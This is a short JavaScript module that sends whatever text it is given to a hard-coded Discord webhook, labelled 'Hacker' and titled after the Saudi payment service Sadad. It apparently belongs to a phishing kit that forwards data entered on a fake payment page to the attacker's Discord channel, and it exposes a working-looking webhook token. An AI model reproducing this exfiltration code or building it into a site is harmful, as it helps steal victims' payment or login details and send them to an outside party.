import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1331255531511484447/YUIldGFRbtBxJsYBZ4mMzXs4IX3cSz4BctdFg6hU--c-ylEa_yV4do_5SA8p-k6Ale5c",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
